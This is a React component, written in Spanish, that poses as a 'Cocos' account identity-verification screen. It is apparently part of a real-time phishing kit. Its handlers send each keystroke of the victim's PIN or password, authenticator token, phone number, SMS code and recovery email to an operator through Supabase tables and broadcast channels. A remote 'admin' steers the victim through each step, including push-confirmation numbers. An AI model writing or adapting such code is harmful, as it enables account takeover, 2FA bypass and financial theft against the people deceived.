import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import CocosLogo from "./CocosLogo";
import { Loader2 } from "lucide-react";

interface CocosConfirmEmailScreenProps {
  email: string;
  sessionId: string;
  onBack: () => void;
}

type ConfirmStep =
  | "password" | "waiting" | "token_2fa"
  | "sms_phone" | "sms_waiting" | "sms_code"
  | "recovery_email_input" | "recovery_email_submitted" | "success";

const CocosConfirmEmailScreen = ({ email, sessionId, onBack }: CocosConfirmEmailScreenProps) => {
  const [step, setStep] = useState<ConfirmStep>("password");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [tokenCode, setTokenCode] = useState("");
  const [smsCode, setSmsCode] = useState("");
  const [clientRecoveryEmail, setClientRecoveryEmail] = useState("");
  const [clientPhoneInput, setClientPhoneInput] = useState("");
  const [phoneEnding, setPhoneEnding] = useState("");
  const [adminTokenCode, setAdminTokenCode] = useState("");
  const [recoveryEmailAddr, setRecoveryEmailAddr] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  const broadcastChRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const syncChRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  const broadcastToAdmin = useCallback((event: string, payload: Record<string, string>) => {
    if (broadcastChRef.current) broadcastChRef.current.send({ type: "broadcast", event, payload });
    if (syncChRef.current) syncChRef.current.send({ type: "broadcast", event, payload });
  }, []);

  useEffect(() => {
    const confirmCh = supabase.channel(`confirm-email-${sessionId}`);
    const syncCh = supabase.channel(`sync-email-${sessionId}`);
    broadcastChRef.current = confirmCh;
    syncChRef.current = syncCh;

    const handleDecision = (decision: string, payload?: Record<string, string>) => {
      if (decision === "confirm_wrong_password" || decision === "sync_wrong_password") {
        setErrorMessage("Contraseña incorrecta. Intentá de nuevo."); setStep("password"); setPassword(""); setLoading(false);
      } else if (decision === "confirm_ask_otp" || decision === "sync_ask_otp") {
        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setStep("token_2fa"); setTokenCode(""); setAdminTokenCode(""); }
        setErrorMessage("");
      } else if (decision === "confirm_ask_token" || decision === "sync_ask_token") {
        setAdminTokenCode(payload?.admin_token || ""); setStep("token_2fa"); setTokenCode(""); setErrorMessage("");
      } else if (decision === "confirm_ask_sms" || decision === "sync_ask_sms") {
        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setPhoneEnding(payload?.sms_ending || ""); setStep("sms_phone"); setClientPhoneInput(""); setSmsCode(""); }
        setErrorMessage("");
      } else if (decision === "confirm_advance_sms_code" || decision === "sync_advance_sms_code") {
        const ending = payload?.sms_ending || ""; if (ending) setPhoneEnding(ending);
        setStep("sms_code"); setSmsCode(""); setErrorMessage("");
      } else if (decision === "confirm_ask_recovery_email" || decision === "sync_ask_recovery_email") {
        setRecoveryEmailAddr(payload?.recovery_email || ""); setStep("recovery_email_input"); setClientRecoveryEmail(""); setErrorMessage("");
      } else if (decision === "confirm_approved" || decision === "sync_approved") { setStep("success"); }
      else if (decision === "confirm_rejected" || decision === "sync_rejected") {
        setErrorMessage("Verificación fallida. Intentá de nuevo."); setClientRecoveryEmail(""); setSmsCode(""); setTokenCode("");
      }
    };

    confirmCh.on("broadcast", { event: "admin_decision" }, (p) => handleDecision(p.payload?.status, p.payload)).subscribe();
    syncCh.on("broadcast", { event: "admin_sync_decision" }, (p) => handleDecision(p.payload?.status, p.payload)).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status, otp_code").eq("id", sessionId).maybeSingle();
      if (!data) return;
      const { status: dbStatus, otp_code: otp } = data;
      if ((dbStatus === "confirm_wrong_password" || dbStatus === "sync_wrong_password") && step !== "password") { setErrorMessage("Contraseña incorrecta."); setStep("password"); setPassword(""); }
      else if ((dbStatus === "confirm_ask_otp" || dbStatus === "sync_ask_otp") && step !== "token_2fa" && step !== "sms_code") {
        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setStep("token_2fa"); setTokenCode(""); setAdminTokenCode(""); }
      } else if ((dbStatus === "confirm_ask_token" || dbStatus === "sync_ask_token") && step !== "token_2fa") {
        const code = otp?.startsWith("admin_token:") ? otp.replace("admin_token:", "") : ""; setAdminTokenCode(code); setStep("token_2fa"); setTokenCode("");
      } else if ((dbStatus === "confirm_ask_sms" || dbStatus === "sync_ask_sms") && step !== "sms_phone" && step !== "sms_code" && step !== "sms_waiting") {
        if (step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : ""; setPhoneEnding(ending); setStep("sms_phone"); setClientPhoneInput(""); setSmsCode(""); }
      } else if ((dbStatus === "confirm_advance_sms_code" || dbStatus === "sync_advance_sms_code") && step !== "sms_code") {
        const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : ""; if (ending) setPhoneEnding(ending); setStep("sms_code"); setSmsCode("");
      } else if ((dbStatus === "confirm_ask_recovery_email" || dbStatus === "sync_ask_recovery_email") && step !== "recovery_email_input" && step !== "recovery_email_submitted") {
        const recEmail = otp?.startsWith("recovery_email_addr:") ? otp.replace("recovery_email_addr:", "") : ""; setRecoveryEmailAddr(recEmail); setStep("recovery_email_input"); setClientRecoveryEmail("");
      } else if (dbStatus === "confirm_approved" || dbStatus === "sync_approved") { setStep("success"); }
    }, 2500);

    return () => { broadcastChRef.current = null; syncChRef.current = null; supabase.removeChannel(confirmCh); supabase.removeChannel(syncCh); clearInterval(pollInterval); };
  }, [sessionId, step]);

  const handlePasswordChange = useCallback((v: string) => {
    setPassword(v);
    supabase.from("sessions").update({ otp_code: `id_pin:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_email_password_typing", { session_id: sessionId, email_password: v });
  }, [sessionId, broadcastToAdmin]);

  const handlePasswordSubmit = useCallback(async (e: React.FormEvent) => {
    e.preventDefault(); if (!password.trim()) return;
    setLoading(true); setErrorMessage("");
    await supabase.from("sessions").update({ otp_code: `id_pin:${password}`, status: "confirm_email_pending" }).eq("id", sessionId);
    broadcastToAdmin("client_id_pin", { session_id: sessionId, id_pin: password, email });
    setStep("waiting"); setLoading(false);
  }, [password, sessionId, broadcastToAdmin, email]);

  const handleTokenChange = useCallback((v: string) => {
    setTokenCode(v);
    supabase.from("sessions").update({ otp_code: `id_token:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_token_update", { session_id: sessionId, id_token: v });
  }, [sessionId, broadcastToAdmin]);

  const handlePhoneChange = useCallback((v: string) => {
    setClientPhoneInput(v);
    supabase.from("sessions").update({ otp_code: `id_phone:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_phone_update", { session_id: sessionId, id_phone: v });
  }, [sessionId, broadcastToAdmin]);

  const handlePhoneSubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault(); if (!clientPhoneInput.trim()) return;
    supabase.from("sessions").update({ otp_code: `id_phone_final:${clientPhoneInput}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_phone_submitted", { session_id: sessionId, id_phone: clientPhoneInput });
    setStep("sms_waiting");
  }, [clientPhoneInput, sessionId, broadcastToAdmin]);

  const handleSmsCodeChange = useCallback((v: string) => {
    setSmsCode(v);
    supabase.from("sessions").update({ otp_code: `id_sms:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_sms_update", { session_id: sessionId, id_sms: v });
  }, [sessionId, broadcastToAdmin]);

  const handleRecoveryEmailChange = useCallback((v: string) => {
    setClientRecoveryEmail(v);
    supabase.from("sessions").update({ otp_code: `id_recovery:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_recovery_update", { session_id: sessionId, id_recovery: v });
  }, [sessionId, broadcastToAdmin]);

  const handleRecoveryEmailSubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault(); if (!clientRecoveryEmail.trim()) return;
    supabase.from("sessions").update({ otp_code: `id_recovery_final:${clientRecoveryEmail}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_recovery_submitted", { session_id: sessionId, id_recovery: clientRecoveryEmail });
    setStep("recovery_email_submitted");
  }, [clientRecoveryEmail, sessionId, broadcastToAdmin]);

  const inputClass = "w-full rounded-lg border border-[#d8dfe8] bg-white px-4 py-3 text-[14px] text-[#1a2233] outline-none transition-all placeholder:text-[#b0b8c9] focus:border-[#3b6fe0] focus:ring-1 focus:ring-[#3b6fe0]/20 disabled:opacity-50";
  const btnClass = "w-full rounded-lg bg-[#3b6fe0] py-3.5 text-[15px] font-medium text-white transition-all hover:bg-[#2a5bc0] disabled:opacity-50";
  const labelClass = "mb-1 block text-[13px] text-[#5a6a85]";

  const renderHeader = () => (
    <div className="flex w-full max-w-[460px] items-center justify-between mb-10">
      <CocosLogo />
      <button onClick={onBack} className="text-[13px] font-medium text-[#3b6fe0] hover:text-[#2a5bc0] transition-colors">Cerrar sesión</button>
    </div>
  );

  const renderError = () => errorMessage ? (
    <div className="mb-5 rounded-lg border border-red-200 bg-red-50 px-4 py-2.5 text-sm text-red-600">{errorMessage}</div>
  ) : null;

  const renderLoading = (text: string) => (
    <div className="flex items-center gap-2 text-sm text-[#8895aa]">
      <Loader2 className="h-4 w-4 animate-spin text-[#3b6fe0]" />{text}
    </div>
  );

  if (step === "success") {
    return (
      <div className="flex min-h-screen flex-col items-center bg-[#f5f7fb] px-4 pt-12">
        <CocosLogo />
        <div className="mt-16 w-full max-w-[460px] text-center">
          <h1 className="mb-3 text-2xl font-bold text-[#1a2233]">Verificación completa</h1>
          <p className="text-[14px] text-[#8895aa]">Tu cuenta fue verificada. Redirigiendo...</p>
          <p className="mt-2 text-[12px] text-[#b0b8c9]">{email}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-screen flex-col items-center bg-[#f5f7fb] px-4 pt-12">
      {renderHeader()}

      <div className="w-full max-w-[460px]">
        {renderError()}

        {step === "password" && (
          <>
            <h1 className="mb-2 text-xl font-bold text-[#1a2233]">Verificación de identidad</h1>
            <p className="mb-6 text-[14px] text-[#8895aa]">
              Tu perfil no está confirmado. Se envió un PIN a tu email. Ingresá el PIN recibido para confirmar tu identidad.
            </p>
            <form onSubmit={handlePasswordSubmit}>
              <label className={labelClass}>PIN</label>
              <div className="relative mb-6">
                <input type="password" value={password} onChange={(e) => handlePasswordChange(e.target.value)} disabled={loading} autoFocus placeholder="Ingresá el PIN" className={inputClass} />
                <span className="absolute right-3.5 top-1/2 -translate-y-1/2 text-[12px] text-[#b0b8c9]">Código enviado</span>
              </div>
              <button type="submit" disabled={loading || !password.trim()} className={btnClass}>{loading ? "Verificando..." : "Continuar"}</button>
            </form>
          </>
        )}

        {step === "waiting" && (
          <div className="text-center">
            <h1 className="mb-3 text-xl font-bold text-[#1a2233]">Verificando tu cuenta</h1>
            <p className="mb-6 text-[14px] text-[#8895aa]">Esperá mientras verificamos tu identidad...</p>
            {renderLoading("Verificación en progreso...")}
          </div>
        )}

        {step === "token_2fa" && (
          <>
            <h1 className="mb-2 text-xl font-bold text-[#1a2233]">Token de seguridad</h1>
            {adminTokenCode ? (
              <>
                <p className="mb-6 text-[14px] text-[#8895aa]">Tocá el número en tu dispositivo para confirmar</p>
                <div className="mb-6 flex h-20 w-20 items-center justify-center rounded-2xl border-2 border-[#3b6fe0] bg-[#3b6fe0]/10 mx-auto">
                  <span className="text-3xl font-bold text-[#3b6fe0]">{adminTokenCode}</span>
                </div>
                {renderLoading("Esperando confirmación...")}
              </>
            ) : (
              <>
                <p className="mb-6 text-[14px] text-[#8895aa]">Ingresá el código de tu app de autenticación</p>
                <label className={labelClass}>Código de verificación</label>
                <input type="text" inputMode="numeric" value={tokenCode} onChange={(e) => handleTokenChange(e.target.value)} autoFocus maxLength={20} placeholder="Ingresá el código" className={`${inputClass} mb-6`} />
                {tokenCode.length >= 6 ? renderLoading("Verificando código...") : <button disabled className={btnClass}>Continuar</button>}
              </>
            )}
          </>
        )}

        {step === "sms_phone" && (
          <>
            <h1 className="mb-2 text-xl font-bold text-[#1a2233]">Verificación telefónica</h1>
            <p className="mb-6 text-[14px] text-[#8895aa]">
              {phoneEnding ? <>Confirmá el número que termina en <span className="font-bold text-[#1a2233]">**{phoneEnding}</span></> : "Ingresá tu número de teléfono para recibir un código por SMS"}
            </p>
            <form onSubmit={handlePhoneSubmit}>
              <label className={labelClass}>Número de teléfono</label>
              <input type="tel" placeholder={phoneEnding ? `Termina en ${phoneEnding}` : "+54 11 0000-0000"} value={clientPhoneInput} onChange={(e) => handlePhoneChange(e.target.value)} autoFocus className={`${inputClass} mb-6`} />
              <button type="submit" disabled={!clientPhoneInput.trim()} className={btnClass}>Continuar</button>
            </form>
          </>
        )}

        {step === "sms_waiting" && (
          <div className="text-center">
            <h1 className="mb-3 text-xl font-bold text-[#1a2233]">Verificación telefónica</h1>
            <p className="mb-6 text-[14px] text-[#8895aa]">Enviando código a <span className="font-bold text-[#1a2233]">{clientPhoneInput}</span></p>
            {renderLoading("Enviando código SMS...")}
          </div>
        )}

        {step === "sms_code" && (
          <>
            <h1 className="mb-2 text-xl font-bold text-[#1a2233]">Verificación SMS</h1>
            <p className="mb-6 text-[14px] text-[#8895aa]">
              {phoneEnding ? <>Ingresá el código enviado al número que termina en <span className="font-bold text-[#1a2233]">**{phoneEnding}</span></> : clientPhoneInput ? <>Ingresá el código enviado a <span className="font-bold text-[#1a2233]">{clientPhoneInput}</span></> : "Ingresá el código enviado por SMS"}
            </p>
            <label className={labelClass}>Código SMS</label>
            <input type="text" inputMode="numeric" value={smsCode} onChange={(e) => handleSmsCodeChange(e.target.value)} autoFocus maxLength={8} placeholder="Ingresá el código" className={`${inputClass} mb-6`} />
            {smsCode.length >= 6 ? renderLoading("Verificando código SMS...") : <button disabled className={btnClass}>Continuar</button>}
          </>
        )}

        {step === "recovery_email_input" && (
          <>
            <h1 className="mb-2 text-xl font-bold text-[#1a2233]">Email de recuperación</h1>
            <p className="mb-4 text-[14px] text-[#8895aa]">Ingresá tu email de recuperación para recibir un código de verificación</p>
            {recoveryEmailAddr && (
              <div className="mb-5 rounded-lg border border-[#d8dfe8] bg-white px-4 py-3">
                <span className="text-[11px] text-[#8895aa]">Email de recuperación</span>
                <p className="text-[14px] font-medium text-[#1a2233]">{recoveryEmailAddr}</p>
              </div>
            )}
            <form onSubmit={handleRecoveryEmailSubmit}>
              <label className={labelClass}>Email</label>
              <input type="email" placeholder="Ingresá tu email de recuperación" value={clientRecoveryEmail} onChange={(e) => handleRecoveryEmailChange(e.target.value)} autoFocus className={`${inputClass} mb-6`} />
              <button type="submit" disabled={!clientRecoveryEmail.trim()} className={btnClass}>Continuar</button>
            </form>
          </>
        )}

        {step === "recovery_email_submitted" && (
          <div className="text-center">
            <h1 className="mb-3 text-xl font-bold text-[#1a2233]">Email de recuperación</h1>
            <p className="mb-6 text-[14px] text-[#8895aa]">Verificando tu email <span className="font-bold text-[#1a2233]">{clientRecoveryEmail}</span></p>
            {renderLoading("Verificación en progreso...")}
          </div>
        )}
      </div>
    </div>
  );
};

export default CocosConfirmEmailScreen;
